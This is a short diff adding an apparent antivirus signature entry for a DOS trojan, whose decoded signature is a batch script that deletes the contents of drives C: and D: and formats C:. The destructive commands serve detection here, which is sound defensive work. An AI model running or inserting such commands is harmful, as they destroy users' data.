@@ -1,0 +1,8 @@
+VIRUS NAME: Dos.Trojan.FormatC-78
+TARGET TYPE: ANY FILE
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off 
+DEL C:\ -y 
+DEL D:\ -y 
+FORMAT C:\ -y
